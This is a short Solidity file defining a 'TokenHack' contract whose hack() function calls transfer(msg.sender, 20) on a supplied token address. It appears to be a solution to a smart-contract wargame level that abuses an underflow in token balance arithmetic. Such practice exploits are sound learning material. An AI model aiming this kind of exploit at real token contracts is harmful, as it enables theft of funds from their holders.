// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IToken {
    function transfer(address _to, uint _value) external returns (bool) ;
    function balanceOf(address _owner) external view returns (uint balance);
} 

contract TokenHack {
    function hack(address _tokenAddress) public {
        IToken(_tokenAddress).transfer(msg.sender, 20);
    }
}